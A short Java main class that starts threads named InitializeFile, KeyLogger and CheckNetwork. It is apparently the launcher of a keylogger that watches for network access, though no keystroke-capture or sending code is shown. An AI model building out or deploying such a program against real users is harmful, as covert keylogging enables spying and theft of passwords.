import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.concurrent.locks.ReentrantLock;
public class Main{
    public static void main(String[] args) {
        ReentrantLock re = new ReentrantLock();
        InitializeFile infObj = new InitializeFile();
        Thread t1 = new Thread(infObj);
        try{
            t1.start();
            t1.join();
        }catch(Exception e){
            System.out.println(e.getMessage());
        }
        KeyLogger kl = new KeyLogger(re);
        Thread t2 = new Thread(kl);
        t2.start();

        // t2.suspend();
        // t2.resume();
        CheckNetwork cn = new CheckNetwork(re);
        Thread t = new Thread(cn);
        t.start();
    }
}